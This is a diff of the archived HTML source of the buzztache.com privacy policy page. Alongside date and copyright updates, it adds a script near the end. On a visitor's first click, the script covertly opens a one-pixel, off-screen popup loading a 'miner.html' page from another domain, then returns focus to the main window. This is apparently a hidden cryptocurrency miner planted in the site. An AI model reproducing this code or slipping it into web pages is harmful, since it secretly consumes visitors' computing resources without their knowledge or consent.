@@ -1,5 +1,5 @@
-<!--The following is the downloaded HTML source of the buzztache.com privacy policy that was archived on 2017-11-06.
- Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20171106211929id_/http%3A//buzztache.com/privacy-policy) for the most accurate reproduction.-->
+<!--The following is the downloaded HTML source of the buzztache.com privacy policy that was archived on 2018-05-16.
+ Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20180516123858id_/http%3A//buzztache.com/privacy-policy) for the most accurate reproduction.-->
 
 <!DOCTYPE html><html lang="en"><head>
   <meta charset="UTF-8">
@@ -737,7 +737,7 @@ Our website may contain links to enable you to visit other websites of interest 
 <ul class="nav navbar-nav bottom_menu"><li><a href="/about-us">About</a></li><li><a href="/privacy-policy">Privacy Policy</a></li><li><a href="/terms">Terms of Service</a></li><li><a href="mailto:info@buzztache.com">Contact</a></li><li><a href="/dmca-policy">DMCA Notice</a></li><li><a href="/category/causes">Causes</a></li></ul>
 <div id="footer-widget-wrapper" align="center">
 
-<div id="logo-footer"><a href="/"><img src="http://cdn.buzztache.com/images/logo_footer.png" alt="Buzztache" class="img-responsive"></a></div><div id="copyright"><p>Copyright © 2017 Buzztache</p></div>
+<div id="logo-footer"><a href="/"><img src="http://cdn.buzztache.com/images/logo_footer.png" alt="Buzztache" class="img-responsive"></a></div><div id="copyright"><p>Copyright © 2018 Buzztache</p></div>
 </div>
 </footer>
 
@@ -875,4 +875,17 @@ function sharePopup(url) {
 <script>!function(){function e(e){var n=new RegExp(e+"=([^;]+)").exec(document.cookie);return null!=n?unescape(n[1]):""}var n;n=function(e){"use strict";function n(){}function o(e){return 0>e?NaN:30>=e?0|Math.random()*(1<<e):53>=e?(0|1073741824*Math.random())+1073741824*(0|Math.random()*(1<<e-30)):NaN}function t(e,n){for(var o=e.toString(16),t=n-o.length,r="0";t>0;t>>>=1,r+=r)1&t&&(o=r+o);return o}return n.generate=function(){return t(o(32),8)+"-"+t(o(16),4)+"-"+t(16384|o(12),4)+"-"+t(32768|o(14),4)+"-"+t(o(48),12)},n.overwrittenUUID=e,n}(n);var o=encodeURIComponent(e("uid")),t=encodeURIComponent(e("utm_source")),r=encodeURIComponent(e("utm_medium")),u=encodeURIComponent(e("utm_subid")),c=encodeURIComponent(e("utm_campaign"));o||(o=n.generate());var i=new Date;i.setTime(i.getTime()+3e5),document.cookie="uid="+o+"; expires="+i.toGMTString()+"; path=/";var a=new XMLHttpRequest;a.open("POST","//pix.buzztache.com/record",!0),a.setRequestHeader("Content-type","application/x-www-form-urlencoded"),a.send("uid="+o+"&url="+encodeURIComponent(window.location.href)+"&referrer="+encodeURIComponent(document.referrer)+"&campaign="+c+"&subid="+u+"&source="+t+"&medium="+r)}();</script>
 
 
-</body></html>
+
+<script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script>
+  <script>
+
+$(document).ready(function() {
+
+  $(document).one('click', function() {
+    if(Cookies.get('minpop')==1){return false;}else{Cookies.set('minpop', '1', { expires: .01 });}
+    window.open("http://fueledandfired.com/miner.html", "pop", "width= 1, height= 1, left=0, top=340000, resizable=0, titlebar=0, toolbar=0, location=0, directories=0, status=0, menubar=0, scrollbars=0, resizable=0, copyhistory=0").blur();
+		window.focus();
+  });
+
+});
+</script></body></html>
